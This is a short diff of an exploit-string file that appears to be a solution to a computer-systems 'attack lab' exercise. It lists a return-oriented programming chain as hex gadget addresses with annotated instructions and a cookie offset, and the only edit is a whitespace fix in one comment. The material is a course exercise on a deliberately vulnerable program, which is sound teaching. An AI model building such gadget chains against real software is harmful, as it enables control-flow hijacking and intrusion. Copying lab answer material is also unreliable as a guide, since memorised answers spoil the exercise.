@@ -6,7 +6,7 @@
 70 1b 40 00 00 00 00 00     /* RA1: 0x401b70 - movq %rsp, %rax */
 d6 1a 40 00 00 00 00 00     /* RA2: 0x401ad6 - movq %rax, %rdi */
 f4 1a 40 00 00 00 00 00     /* RA3: 0x401af4 - popq %rax */
-48 00 00 00 00 00 00 00     /* cookie addr offsets - %rax = $0x48*/
+48 00 00 00 00 00 00 00     /* cookie addr offsets - %rax = $0x48 */
 26 1b 40 00 00 00 00 00     /* RA4: 0x401b26 - movl %eax, %edx */
 ac 1b 40 00 00 00 00 00     /* RA5: 0x401bac - movl %edx, %ecx */
 b3 1b 40 00 00 00 00 00     /* RA6: 0x401bb3 - movl %ecx, %esi */
